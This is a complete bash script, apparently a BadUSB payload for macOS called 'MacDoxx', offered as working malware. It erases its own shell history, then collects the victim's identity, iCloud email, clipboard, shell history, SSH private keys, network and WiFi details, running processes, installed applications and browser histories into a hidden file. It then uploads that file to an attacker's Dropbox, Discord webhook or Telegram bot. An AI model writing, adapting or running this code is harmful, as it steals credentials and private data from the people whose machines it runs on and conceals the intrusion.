#!/bin/bash
##################################################################
# Global config
##################################################################

EXFIL_TO=$1
ACCESS_TOKEN=$2

##################################################################
# Helpers
##################################################################

SCRIPT_NAME="MacDoxx"
OUTPUT_FILE=/tmp/.loot.txt # Path where the loot file is stored. This is the file where all data is stored and that will be exfiltrated. Hidden file so it will not be shown in the Finder with the default config
VERSION="v1.0.0"

# Helper for printing an empty line
empty_line() {
  echo ""
}
# Remove the loot file once it has been exifltrated
remove_loot_file() {
  rm -f "$OUTPUT_FILE"
}
# The name of the loot file that will be exfiltrated
uploaded_loot_file_name() {
  echo "$SCRIPT_NAME"_$(date +"%d-%m-%YT%H:%M:%S")
}
# Remove the commands executed with BadUSB in order to not leave any trace on the victim host
clear_history() {
  sed -i '' -e :a -e '$d;N;2ba' -e 'P;D' $HISTFILE
}
# Helper for printing date and time of when the script is executed
start_datetime() {
  START_DATE=$(date)
  echo "Started executing on: $START_DATE"
  empty_line
}
# Helper for printing loot category header before the actual loot data into $OUTPUT_FILE
loot_category_header() {
  local title="$1" # The title to be centered
  local width=60 # Total width of the header
  local border_char="=" # Character for the border

  # Generate the border line
  local border_line=$(printf "%${width}s" | tr " " "${border_char}")

  # Calculate padding for centering
  local title_length=${#title}
  local padding=$(( (width - title_length - 4) / 2 ))  # Subtracting 4 for "== " and " =="
  local padding_left=$(printf "%${padding}s" "")
  local padding_right=$(( width - title_length - padding - 4 ))

  # Print the header
  echo "${border_line}"
  printf "==%s%s%s==\n" "$padding_left" "$title" "$(printf "%${padding_right}s" "")"
  echo "${border_line}"
}


##################################################################
# User loot
##################################################################
username() {
  echo "- Username: $USER"
}

fullname() {
  FULL_NAME=$(id -F)
  echo "- Full name: $FULL_NAME"
}

icloud_email() {
  local LOOT=$(defaults read MobileMeAccounts Accounts | grep AccountID | awk '{print $3}' | tr -d '";\n')
  echo "- iCloud email: $LOOT"
}

clipboard_content() {
  local LOOT=$(osascript -e "the clipboard")
  echo "- Clipboard content:"
  echo "$LOOT" # Print clipboard content on a new line
}

default_shell() {
  echo "- User shell: $SHELL"
}

shell_history() {
  echo "- Shell history ($HISTFILE):"
  local LOOT=$(cat $HISTFILE)
  echo "$LOOT"
}

user_ssh() {
  if [ -d $SSH_DIR ]; then
    echo "- SSH config:"
    if [[ -f $HOME/.ssh/config ]]; then
      local LOOT=$(cat $HOME/.ssh/config)
      echo "$LOOT"
    else
      echo "!!! No SSH config file !!!"
    fi
    empty_line

    local KEYS=$(find $HOME/.ssh -perm 600 ! -name "known_hosts" ! -name "known_hosts.old" ! -name "config" ! -name "config.old" ! -name "authorized_keys" ! -name "authorized_keys.old")
    local KEYS_COUNT=$(echo "$KEYS" | wc -l | tr -d "\t\n ")
    echo "- SSH keys ($KEYS_COUNT potential keys):"
    for key in $KEYS; do
      echo -e "\t- Private key $key:"
      local PRIV_KEY=$(cat $key)
      echo "$PRIV_KEY"
      empty_line
      echo -e "\t- Matching public key $key:"
      if [[ -f $key.pub ]]; then
        local PUB_KEY=$(cat $key.pub)
        echo $PUB_KEY
        empty_line
      else
        echo "!!! No matching public key found !!!"
        empty_line
      fi
    done
  else
    echo "!!! .ssh directory doesn't exists !!!"
  fi
}

loot_user() {
  local LOOT_TITLE="User loot"
  loot_category_header "$LOOT_TITLE"
  username
  empty_line
  fullname
  empty_line
  icloud_email
  empty_line
  clipboard_content
  empty_line
  default_shell
  empty_line
  shell_history
  empty_line
  user_ssh
  empty_line
}

##################################################################
# System loot
##################################################################
hostname() {
  HOSTNAME=$(uname -n)
  echo "- Hostname: $HOSTNAME"
}

uptime() {
  local LOOT=$(system_profiler SPSoftwareDataType | grep "Time since boot" | sed 's/Time since boot\://g' | sed 's/ //g' | sed 's/,/, /g' | sed 's/d/ d/g' | sed 's/m/ m/g' | sed 's/h/ h/g')
  echo "- Uptime: $LOOT"
}

macos_version() {
  local LOOT=$(sw_vers | tr -d "\t")
  echo "- OS info:"
  for line in $LOOT; do
    echo -e "\t- $line" | sed 's/:/: /g'
  done
}

kernel_version() {
  local LOOT=$(uname -srvmp)
  echo "- Kernel info:"
  echo "$LOOT"
}

hardware_model() {
  local LOOT=$(system_profiler SPHardwareDataType)
  echo "- $LOOT"
}

loot_system() {
  local LOOT_TITLE="System loot"
  loot_category_header "$LOOT_TITLE"
  hostname
  empty_line
  uptime
  empty_line
  macos_version
  empty_line
  kernel_version
  empty_line
  hardware_model
  empty_line
}

##################################################################
# Disks loot
##################################################################
disks() {
  local LOOT=$(diskutil list)
  echo "- Disks:"
  echo "$LOOT"
}

loot_disks() {
  local LOOT_TITLE="Disks loot"
  loot_category_header "$LOOT_TITLE"
  disks
  empty_line
}

##################################################################
# Network loot
##################################################################
network_interfaces() {
  local LOOT=$(ifconfig | awk '/^[a-z]/ { iface=$1 } /ether/ { print "Interface:", iface, "MAC:", $2 } /inet / { print "Interface:", iface, "IPv4:", $2 }')
  echo "- Network interfaces:"
  while IFS= read -r interface; do
    echo -e "\t- $interface"
  done <<< "$LOOT"
}

connected_wifi_name() {
  local LOOT=$(ipconfig getsummary en0 | grep " SSID" | awk -F 'SSID : ' '/SSID :/ {print $2}')
  if [ -z "$LOOT" ]; then
    echo "- Current WiFi SSID:"
    echo "!!! Not connected to any WiFi network !!!"
  else
    echo "- Current WiFi SSID: $LOOT"
  fi
}

public_ip() {
  local LOOT=$(curl -s -f ipinfo.io/ip)
  if [ $? -ne 0 ]; then
    echo "- Public IP address:"
    echo "!!! Got error from curl. Maybe not connected or ipinfo.io is down !!!"
  else
    echo "- Public IP address: $LOOT"
  fi
}

nearby_wifis() {
  echo "- Nearby WiFi and additional details on WiFi card:"

  local LOOT=$(system_profiler SPAirPortDataType | tail -n +3)
  if [ $? -ne 0 ]; then
    echo "!!! Error while trigger system_profiler command !!!"
  else
    echo "$LOOT"
  fi
}

known_wifis() {
  echo "- Known SSIDs:"
  local LOOT=$(networksetup -listpreferredwirelessnetworks en0 | tail -n +2 | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
  if [ $? -ne 0 ]; then
    echo "!!! Error while listing preferred WiFi networks !!!"
  else
    echo "$LOOT"
  fi
}

loot_network() {
  local LOOT_TITLE="Network loot"
  loot_category_header "$LOOT_TITLE"
  network_interfaces
  empty_line
  connected_wifi_name
  empty_line
  public_ip
  empty_line
  nearby_wifis
  empty_line
  known_wifis
  empty_line
}

##################################################################
# Processes loot
##################################################################
cpu_ram_usage() {
  local LOOT=$(top -l 1 | grep -E "^CPU|^Phys")
  echo "- CPU and RAM usage:"
  echo "$LOOT"
}

logged_users() {
  local LOOT=$(who)
  echo "- Logged in users:"
  echo "$LOOT"
}

running_processes() {
  local LOOT=$(ps aux)
  echo "- Running processes:"
  echo "$LOOT"
}

active_connections() {
  local LOOT=$(lsof -i -nP | grep -i ESTABLISHED)
  echo "- Active connections:"
  echo "$LOOT"
}

loot_processes() {
  local LOOT_TITLE="Processes loot"
  loot_category_header "$LOOT_TITLE"
  cpu_ram_usage
  empty_line
  logged_users
  empty_line
  running_processes
  empty_line
  active_connections
  empty_line
}

##################################################################
# Applications loot
##################################################################
homebrew_data() {
  local LOOT=$(brew -v)
  if [ $? -eq 0 ]; then
    echo "- Homebrew installed: Y"
    empty_line
    echo "- Homebrew version:"
    echo "$LOOT"
    empty_line
    echo "- Homebrew installed applications:"
    local LOOT=$(brew bundle dump --file=-)
    echo "$LOOT"
  else
    echo "- Homebrew installed: N"
  fi
}

check_xcode_tools() {
  xcode-select -p > /dev/null 2&>1
  if [ $? -eq 0 ]; then
    echo "- XCode Tools installed: Y"
  else
    echo "- XCode Tools installed: N"
  fi
}

list_installed_applications() {
  echo "- Installed applications:"
  local LOOT=$(system_profiler SPApplicationsDataType | tail -n +2)
  if [ $? -ne 0 ]; then
    echo "!!! Error while executing system_profiler command for applications list !!!"
  else
    echo "$LOOT"
  fi
}

loot_applications() {
  local LOOT_TITLE="Applications loot"
  loot_category_header "$LOOT_TITLE"
  homebrew_data
  empty_line
  check_xcode_tools
  empty_line
  list_installed_applications
  empty_line
}
##################################################################
# Browsers loot
##################################################################
default_web_browser() {
  local LOOT=$(defaults read com.apple.LaunchServices/com.apple.launchservices.secure LSHandlers | grep -A 5 "com.apple.default-app.web-browser" | grep 'LSHandlerRoleAll =' | awk -F '"' '{print $2}' | tr -d "\n-")
  echo "- Default web browser: $LOOT"
}

safari_history() {
  local DB="/tmp/safari.db"
  cp "$HOME/Library/Safari/History.db" "$DB" > /dev/null # Create a copy of the file so it will not be locked if Safari is running
  echo "- Safari history (last 7 days):"
  local LOOT=$(sqlite3 -header -csv $DB \
  "SELECT datetime(history_visits.visit_time + 978307200, 'unixepoch') as visit_date, 
         history_items.url 
   FROM history_visits 
   JOIN history_items ON history_visits.history_item = history_items.id 
   WHERE visit_date >= datetime('now', '-7 days') 
   ORDER BY visit_date DESC;")
  if [ $? -ne 0 ]; then
    echo "!!! Error while querying sqlite db file for Safari !!!"
  else
    echo "$LOOT"
  fi
  rm -f "$DB" > /dev/null
}

chrome_history() {
  local CHROME_HISTORY="$HOME/Library/Application\ Support/Google/Chrome/Default/History"
  echo "- Chrome history (last 7 days):"
  if [ -z "$CHROME_HISTORY" ]; then
    local DB="/tmp/chrome.db"
    cp "$CHROME_HISTORY" "$DB" # Create a copy of the file so it will not be locked if Chrome is running
    local LOOT=$(sqlite3 -header -csv $DB \
    "SELECT datetime(last_visit_time/1000000-11644473600, 'unixepoch') as visit_date, 
           title, 
           url 
     FROM urls 
     WHERE visit_date >= datetime('now', '-7 days') 
     ORDER BY last_visit_time DESC;")
    if [ $? -ne 0 ]; then
      echo "!!! Error while querying sqlite db file for Chrome !!!"
    else
      echo "$LOOT"
    fi
    rm -f "$DB" > /dev/null
  else
    echo "!!! Chrome not installed !!!"
  fi
}

firefox_history() {
  local FIREFOX_DIR="$HOME/Library/Application Support/Firefox/Profiles"
  echo "- Firefox history (last 7 days):"
  if [ -d "$FIREFOX_DIR" ]; then
    for profile_db in "$FIREFOX_DIR"/*.default*/places.sqlite; do
      local PROFILE_NAME=$(basename "$(dirname $profile_db)")
      empty_line
      echo "Profile: $PROFILE_NAME"

      local DB="/tmp/firefox.db"
      cp "$profile_db" "$DB" # Create a copy of the file so it will not be locked if Firefox is running

      local LOOT=$(sqlite3 -header -csv "$DB" \
      "SELECT datetime(last_visit_date/1000000, 'unixepoch') as visit_date, title, url 
      FROM moz_places 
      WHERE visit_date >= datetime('now', '-7 days') 
      ORDER BY visit_date DESC;")

      if [ $? -ne 0 ]; then
        echo "!!! Error while querying sqlite db file for this Firefox profile !!!"
      else
        echo "$LOOT"
      fi
      rm -f "$DB" > /dev/null
    done
  else
    echo "!!! Firefox not installed !!!"
  fi
}
loot_browsers() {
  local LOOT_TITLE="Browsers loot"
  loot_category_header "$LOOT_TITLE"
  default_web_browser
  safari_history
  empty_line
  chrome_history
  empty_line
  firefox_history
}
##################################################################
# Exfiltration functions
##################################################################
exfiltrate_to_dropbox() {
  local UPLOADED_NAME=$(uploaded_loot_file_name)
  curl -X POST https://content.dropboxapi.com/2/files/upload \
  --header "Authorization: Bearer $ACCESS_TOKEN" \
  --header "Dropbox-API-Arg: {\"autorename\":true,\"mode\":\"add\",\"mute\":false,\"path\":\"/$UPLOADED_NAME.txt\"}" \
  --header "Content-Type: application/octet-stream" \
  --data-binary @$OUTPUT_FILE > /dev/null 2&>1
}

exfiltrate_to_discord() {
  local UPLOADED_NAME=$(uploaded_loot_file_name)
  local OS_VERSION="$(sw_vers -productName) $(sw_vers -productVersion) ($(sw_vers -buildVersion))"
  curl -X POST "$ACCESS_TOKEN" \
  -F "file=@$OUTPUT_FILE;filename=$UPLOADED_NAME.txt" \
  -F "payload_json={\"username\": \"MacDoxx Agent\", \"avatar_url\": \"https://imgcdn.stablediffusionweb.com/2024/11/17/7d3849f7-e918-437c-abfa-56e82340cabc.jpg\", \"embeds\": [ { \"title\": \"New target loot acquired!\", \"color\": 13369599, \"fields\": [ { \"name\": \"📅 Acquisition date:\", \"value\": \"$START_DATE\", \"inline\": false }, { \"name\": \"🖥️ Hostname:\", \"value\": \"$HOSTNAME\", \"inline\": true }, { \"name\": \"ℹ️ OS Version:\", \"value\": \"$OS_VERSION\", \"inline\": true }, { \"name\": \"👤 User:\", \"value\": \"$FULL_NAME (*$USER*)\", \"inline\": false } ], \"author\": { \"name\": \"💰 macdoxx_payload 💰\" } } ]}" > /dev/null 2>&1
}

exfiltrate_to_telegram() {
  local UPLOADED_NAME=$(uploaded_loot_file_name)
  IFS=',' read -r TELEGRAM_BOT_TOKEN CHAT_ID <<< "$ACCESS_TOKEN"
  curl -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendDocument" \
  -F "chat_id=$CHAT_ID" \
  -F "document=@$OUTPUT_FILE" \
  -F "caption=Whop whop, we got some new f*cking loot!"
}

exfiltrate() {
  case $EXFIL_TO in
    db)
      exfiltrate_to_dropbox
      ;;
    ds)
      exfiltrate_to_discord
      ;;
    tg)
      exfiltrate_to_telegram
      ;;
  esac
  remove_loot_file
}
##################################################################
# Complete loot grabbing
##################################################################
grab_all_the_loot() {
  start_datetime
  loot_user
  loot_system
  loot_disks
  loot_network
  loot_processes
  loot_applications
  loot_browsers
}

clear_history
grab_all_the_loot > $OUTPUT_FILE
exfiltrate